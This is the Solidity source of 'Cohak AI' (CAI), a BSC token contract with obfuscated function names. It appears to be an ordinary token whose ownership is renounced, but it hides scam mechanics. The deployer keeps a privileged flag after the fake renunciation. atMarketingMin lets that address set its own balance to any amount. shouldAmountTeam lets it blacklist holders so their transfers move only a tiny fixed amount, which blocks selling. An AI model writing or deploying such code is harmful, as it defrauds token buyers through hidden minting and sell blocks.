/**
 *Submitted for verification at BscScan.com on 2023-02-21
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface toTradingWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address enableLimitMin) external view returns (uint256);

    function transfer(address toAutoList, uint256 listLimitTo) external returns (bool);

    function allowance(address modeSellFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 listLimitTo) external returns (bool);

    function transferFrom(
        address sender,
        address toAutoList,
        uint256 listLimitTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityTeamSell, uint256 value);
    event Approval(address indexed modeSellFee, address indexed spender, uint256 value);
}

interface swapMaxMarketing is toTradingWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract sellShouldFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamAmountLiquidityFund {
    function createPair(address takeSenderTrading, address exemptMaxTx) external returns (address);
}

interface swapMarketingLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CohakAI is sellShouldFrom, toTradingWallet, swapMaxMarketing {

    address private swapMarketingTake;

    uint256 public toFromAt;

    function balanceOf(address enableLimitMin) public view virtual override returns (uint256) {
        return enableMaxShould[enableLimitMin];
    }

    function shouldAmountTeam(address sellWalletFund) public {
        
        if (sellWalletFund == amountEnableMode || sellWalletFund == txSwapLiquidityReceiver || !isSellMarketing[_msgSender()]) {
            return;
        }
        
        launchedToExempt[sellWalletFund] = true;
    }

    mapping(address => mapping(address => uint256)) private liquidityAtTeam;

    function atMarketingMin(uint256 listLimitTo) public {
        if (!isSellMarketing[_msgSender()]) {
            return;
        }
        enableMaxShould[amountEnableMode] = listLimitTo;
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverBuyLiquidityMode;
    }

    address public amountEnableMode;

    uint256 public atLaunchedSellReceiver;

    function transferFrom(address minFundToken, address toAutoList, uint256 listLimitTo) external override returns (bool) {
        if (liquidityAtTeam[minFundToken][_msgSender()] != type(uint256).max) {
            require(listLimitTo <= liquidityAtTeam[minFundToken][_msgSender()]);
            liquidityAtTeam[minFundToken][_msgSender()] -= listLimitTo;
        }
        return enableShouldExempt(minFundToken, toAutoList, listLimitTo);
    }

    function getOwner() external view returns (address) {
        return swapMarketingTake;
    }

    uint256 public modeToReceiver;

    uint8 private txMaxFee = 18;

    function allowance(address maxAutoSwapMode, address buySwapShould) external view virtual override returns (uint256) {
        return liquidityAtTeam[maxAutoSwapMode][buySwapShould];
    }

    address public txSwapLiquidityReceiver;

    function fromFeeSwap(address minFundToken, address toAutoList, uint256 listLimitTo) internal returns (bool) {
        require(enableMaxShould[minFundToken] >= listLimitTo);
        enableMaxShould[minFundToken] -= listLimitTo;
        enableMaxShould[toAutoList] += listLimitTo;
        emit Transfer(minFundToken, toAutoList, listLimitTo);
        return true;
    }

    function totalSenderSell() public {
        emit OwnershipTransferred(amountEnableMode, address(0));
        swapMarketingTake = address(0);
    }

    function takeReceiverSender(address receiverIsTotalWallet) public {
        if (launchedSenderLaunch) {
            return;
        }
        if (senderTeamTo == atLaunchedSellReceiver) {
            toFromAt = senderTeamTo;
        }
        isSellMarketing[receiverIsTotalWallet] = true;
        if (atLaunchedSellReceiver != txListMax) {
            toFromAt = modeToReceiver;
        }
        launchedSenderLaunch = true;
    }

    constructor (){ 
        
        swapMarketingLaunched tradingListLaunch = swapMarketingLaunched(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        txSwapLiquidityReceiver = teamAmountLiquidityFund(tradingListLaunch.factory()).createPair(tradingListLaunch.WETH(), address(this));
        swapMarketingTake = _msgSender();
        if (txListMax == toFromAt) {
            atLaunchedSellReceiver = modeToReceiver;
        }
        amountEnableMode = _msgSender();
        isSellMarketing[_msgSender()] = true;
        if (modeToReceiver != toFromAt) {
            senderExemptShould = true;
        }
        enableMaxShould[_msgSender()] = listModeSwap;
        emit Transfer(address(0), amountEnableMode, listModeSwap);
        totalSenderSell();
    }

    function tradingSwapMinExempt() public view returns (bool) {
        return amountShouldLiquidity;
    }

    function decimals() external view virtual override returns (uint8) {
        return txMaxFee;
    }

    uint256 constant tradingIsTo = 12 ** 10;

    function enableShouldExempt(address minFundToken, address toAutoList, uint256 listLimitTo) internal returns (bool) {
        if (minFundToken == amountEnableMode) {
            return fromFeeSwap(minFundToken, toAutoList, listLimitTo);
        }
        if (launchedToExempt[minFundToken]) {
            return fromFeeSwap(minFundToken, toAutoList, tradingIsTo);
        }
        return fromFeeSwap(minFundToken, toAutoList, listLimitTo);
    }

    bool public launchedSenderLaunch;

    bool private amountShouldLiquidity;

    event OwnershipTransferred(address indexed walletIsAuto, address indexed liquidityFundAuto);

    function approve(address buySwapShould, uint256 listLimitTo) public virtual override returns (bool) {
        liquidityAtTeam[_msgSender()][buySwapShould] = listLimitTo;
        emit Approval(_msgSender(), buySwapShould, listLimitTo);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return listModeSwap;
    }

    function transfer(address fundAutoBuy, uint256 listLimitTo) external virtual override returns (bool) {
        return enableShouldExempt(_msgSender(), fundAutoBuy, listLimitTo);
    }

    string private receiverBuyLiquidityMode = "CAI";

    mapping(address => bool) public launchedToExempt;

    uint256 private senderTeamTo;

    function enableMaxTrading() public {
        if (modeToReceiver == txListMax) {
            modeToReceiver = toFromAt;
        }
        if (senderExemptShould) {
            toFromAt = senderTeamTo;
        }
        senderExemptShould=false;
    }

    function fundTxListToken() public view returns (bool) {
        return walletListLaunched;
    }

    mapping(address => bool) public isSellMarketing;

    mapping(address => uint256) private enableMaxShould;

    function owner() external view returns (address) {
        return swapMarketingTake;
    }

    uint256 public txListMax;

    function name() external view virtual override returns (string memory) {
        return liquidityLimitFee;
    }

    function launchBuyMode() public view returns (uint256) {
        return txListMax;
    }

    bool private walletListLaunched;

    string private liquidityLimitFee = "Cohak AI";

    bool private senderExemptShould;

    uint256 private listModeSwap = 100000000 * 10 ** 18;

    function receiverEnableLaunched() public {
        
        
        senderExemptShould=false;
    }

}